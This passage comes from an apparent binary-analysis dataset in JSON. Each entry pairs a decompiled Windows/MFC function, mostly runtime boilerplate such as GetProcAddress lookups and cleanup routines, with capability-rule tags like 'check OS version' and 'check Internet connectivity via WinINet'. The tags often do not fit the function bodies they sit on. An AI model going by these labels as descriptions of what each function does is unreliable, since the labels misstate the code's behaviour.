        "decompiled_code": "\nvoid fcn.00428c0f(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00428c45": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428c45(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x84;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"ImageList_Read\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 140
    },
    "00428ce8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428ce8(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428d1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428d1e(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x88;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"ImageList_Write\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 141
    },
    "00428dc4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428dc4(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428dfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428dfa(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xa0;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"ImageList_Merge\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 140
    },
    "00428eac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428eac(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428ee2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428ee2(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xcc;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"MakeDragList\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 139
    },
    "00428f85": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428f85(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428fbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428fbb(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0xd4;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"LBItemFromPt\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 141
    },
    "00429069": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00429069(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != -1;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00429274": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429274(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.004170a2(0x431e1b);\n        iVar3 = fcn.004170b4(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004319cf(0x48d0b8, 0x428993, 0x428255, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.004170a2(uVar2);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 316
    },
    "00429312": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00429312(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.004292e8();\n    uVar1 = fcn.004290c5(uVar1);\n    return uVar1;\n}\n",
        "token_count": 83
    },
    "00429b9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00429b9a(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    if (param_2 == 0) {\n        puVar1 = param_1 + 0x12;\n    }\n    else {\n        puVar1 = param_1 + 0x18;\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    uVar2 = *puVar1;\n    if ((uVar2 != 0) && (param_2 == 0)) {\n        uVar2 = uVar2 - 2;\n    }\n    return puVar1 + uVar2 + 5 & 0xfffffffc;\n}\n",
        "token_count": 288
    },
    "0042a258": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a258(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0041901a();\n    }\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    return;\n}\n",
        "token_count": 317
    },
    "0042a2b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a2b6(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    iVar3 = arg_8h;\n    if (*(arg_8h + 0x4c) != 0) {\n        arg_8h = *(*(arg_8h + 0x4c) + 0x44);\n        while (arg_8h != 0) {\n            piVar4 = fcn.0041c771(&arg_8h);\n            iVar2 = *piVar4;\n            if (*(iVar2 + 4) != 0) {\n                iVar5 = *(*(iVar2 + 4) + 0x94);\n                while (iVar5 != 0) {\n                    fcn.0043d8e9(*(iVar2 + 4));\n                    if (*(iVar5 + 4) != 0) {\n                        iVar5 = fcn.0042244f(*(iVar5 + 4));\n                        fcn.004402e3(*(iVar5 + 0x50));\n                    }\n                    iVar5 = fcn.0043d8f2();\n                }\n                iVar1 = *(*(iVar2 + 4) + 0x98);\n                if (iVar1 != 0) {\n                    iVar5 = fcn.0042244f(iVar1);\n                    (**(**(iVar5 + 0x50) + 0xb4))();\n                    *(*(iVar2 + 4) + 0x98) = *(iVar5 + 0x50);\n                    (**(**(*(iVar5 + 0x50) + 0x90) + 8))(*(iVar2 + 4), 1);\n                }\n            }\n        }\n        arg_8h = *(*(iVar3 + 0x4c) + 0x44);\n        while (arg_8h != 0) {\n            piVar4 = fcn.0041c771(&arg_8h);\n            iVar3 = *(*piVar4 + 4);\n            if ((iVar3 != 0) && (*(iVar3 + 0x90) != 0)) {\n                (**(**(iVar3 + 0x90) + 0xc))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "0042a68f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042a68f(uint param_1, uint param_2, int32_t param_3, uint *param_4, int16_t param_5, int32_t *param_6, \n                 uint32_t param_7, uint *param_8)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uchar *in_stack_ffffff74;\n    int32_t iStack92;\n    int32_t iStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint *puStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar auStack24 [16];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ &stack0xffffffb0;\n    iStack80 = 0x50;\n    fcn.00458e45();\n    uStack52 = param_1;\n    uStack72 = param_2;\n    puStack60 = param_8;\n    puStack36 = param_4 + 0x12;\n    if (param_3 != 0) {\n        puStack36 = param_4 + 6;\n        param_4 = &stack0xffffff90;\n    }\n    (*_sym.imp.USER32.dll_MapDialogRect)();\n    iStack44 = 0;\n    if (3 < param_7) {\n        iVar3 = *param_6;\n        param_7 = param_7 - 4;\n        param_6 = param_6 + 1;\n        if (iVar3 != 0) {\n            iStack44 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)();\n            param_6 = param_6 + iVar3 * 2;\n            param_7 = param_7 + iVar3 * -2;\n        }\n    }\n    iStack48 = 0;\n    iStack92 = fcn.00423280();\n    fcn.00401680();\n    uStack68 = 0;\n    iStack64 = 0;\n    uStack56 = 0;\n    if ((param_5 == 0x37a) || (param_5 == 0x37b)) {\n        iStack80 = *param_6;\n        iStack32 = iStack80 + -0xc;\n        param_6 = param_6 + 3;\n        while (iStack32 != 0) {\n            iStack76 = *param_6;\n            iStack32 = iStack32 + -6;\n            uVar1 = *(param_6 + 1);\n            piVar4 = param_6 + 6;\n            if (iStack76 == -0x7ffeffff) {\n                iStack64 = *piVar4;\n                uStack56 = *(param_6 + 10);\n                iStack92 = param_6 + 0x16;\n                fcn.00402280();\n                iStack32 = iStack32 + (-0x11 - *(iStack40 + -0xc));\n                param_6 = param_6 + *(iStack40 + -0xc) + 0x17;\n                uStack68 = uVar1;\n            }\n            else {\n                iVar2 = fcn.004170b4();\n                iVar3 = iStack48;\n                param_6 = piVar4;\n                if (iVar2 == 0) {\n                    iStack48 = 0;\n                }\n                else {\n                    iStack48 = fcn.0043d8c3();\n                    iStack92 = iVar3;\n                }\n            }\n        }\n        param_7 = param_7 - iStack80;\n        param_5 = param_5 + -4;\n    }\n    if (*puStack36 == 0x7b) {\n        puStack36 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        puStack36 = (*_sym.imp.ole32.dll_CLSIDFromProgID)();\n    }\n    fcn.00443cb4(param_6, param_7, 0);\n    iStack28 = 0;\n    if ((-1 < puStack36) && (iVar3 = fcn.0043b4f1(1),  iVar3 != 0)) {\n        in_stack_ffffff74 = &stack0xffffff80;\n        iVar3 = fcn.0043bafe(0, &stack0xffffffe8, 0, *param_4, in_stack_ffffff74, *(param_4 + 4), \n                             -(param_5 != 0x378) & &stack0xffffff54, param_5 == 0x377, iStack44, &stack0xffffffe4);\n        if (iVar3 != 0) {\n            uStack164 = 0x42a8dd;\n            fcn.0043cdf3(1);\n            uStack164 = 0x13;\n            uStack168 = 0;\n            uStack172 = 0;\n            (*_sym.imp.USER32.dll_SetWindowPos)(*(iStack28 + 0x24), uStack72, 0, 0);\n            *(iStack28 + 0x94) = iStack48;\n            fcn.00402200();\n            *(iStack28 + 0x98) = uStack68;\n            *(iStack28 + 0x9c) = iStack64;\n            *(iStack28 + 0xa0) = uStack56;\n        }\n    }\n    if (iStack44 != 0) {\n        uStack164 = 0x42a944;\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n    }\n    if (iStack28 == 0) {\n        *puStack60 = 0;\n    }\n    else {\n        *puStack60 = *(iStack28 + 0x24);\n    }\n    fcn.00444069();\n    fcn.004010d0();\n    *in_FS_OFFSET = iStack92;\n    fcn.004566a8(in_stack_ffffff74);\n    return;\n}\n",
        "token_count": 1427
    },
    "0042ab2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0042ab2e(void)\n\n{\n    code *pcVar1;\n    char *pcStack12;\n    \n    if (*0x4ad1b0 == 0) {\n        *0x4ad1b0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (*0x4ad1b0 == 0) {\n            pcStack12 = 0x4a8690;\n            fcn.00456b8d(&pcStack12, 0x49ed44);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        pcStack12 = \"CreateActCtxW\";\n        *0x4ad1a0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4ad1b0);\n        *0x4ad1a4 = (*pcVar1)(*0x4ad1b0, \"ReleaseActCtx\");\n        *0x4ad1a8 = (*pcVar1)(*0x4ad1b0, \"ActivateActCtx\");\n        *0x4ad1ac = (*pcVar1)(*0x4ad1b0, \"DeactivateActCtx\");\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "0042abdb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar fcn.0042abdb(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    \n    if (param_2 == 0) {\n        fcn.0041901a();\n    }\n    if (*0x4ad1a8 == 0) {\n        uVar2 = 2;\n    }\n    else {\n        iVar1 = fcn.0042abbb(param_1, param_2);\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 125
    },
    "0042ac0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ac0b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint arg_8h;\n    uint uStack564;\n    uint uStack560;\n    uchar *puStack556;\n    uint uStack544;\n    uint uStack536;\n    uchar auStack532 [96];\n    uchar auStack436 [424];\n    int16_t iStack12;\n    ushort uStack10;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack436;\n    fcn.0042ab2e();\n    uVar2 = *(param_1 + 8);\n    uStack10 = 0;\n    iStack12 = 0;\n    arg_8h = 0x105;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(uVar2, auStack532);\n    if (iVar1 != 0) {\n        if (iStack12 == 0) {\n            puStack556 = auStack532;\n            puVar3 = &uStack564;\n            uStack564 = 0x20;\n            uStack560 = 0x88;\n            uStack544 = 2;\n            uStack536 = uVar2;\n            iVar1 = fcn.0042ab9c(puVar3);\n            *(param_1 + 0x80) = iVar1;\n            if (iVar1 == -1) {\n                uStack544 = 3;\n                uVar2 = fcn.0042ab9c(&uStack564);\n                *(param_1 + 0x80) = uVar2;\n            }\n            if (*(param_1 + 0x80) == -1) {\n                uStack544 = 1;\n                iVar1 = fcn.0042ab9c(puVar3, &uStack564);\n                *(param_1 + 0x80) = iVar1;\n                if (iVar1 == -1) {\n                    *(param_1 + 0x80) = 0;\n                }\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x6f);\n        }\n    }\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 507
    },
    "0042b0b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b0b9(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x13c))();\n    }\n    fcn.004170df(param_1[0x12]);\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.00432378();\n            fcn.004170df(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "0042b2e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b2e5(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CDllIsolationWrapperBase.0;\n    if (*(param_1 + 2) != '\\0') {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(param_1[1]);\n    }\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0042b84e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042b84e(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0042b7b9();\n    if ((*(iVar1 + 0x7c) == 0) || (*(param_2 + 0x80) == -1)) {\n        *(param_1 + 4) = 0;\n    }\n    else {\n        uVar2 = fcn.0042abbb(*(param_2 + 0x80), param_1);\n        *(param_1 + 4) = uVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 158
    },
    "0042b92e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042b92e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.004170a2(0x431e1b);\n        iVar3 = fcn.004170b4(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004319cf(0x48e200, 0x42b919, 0x42b88d, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.004170a2(uVar2);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 319
    },
    "0042ba1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042ba1d(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0042b9f3();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "0042c11c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
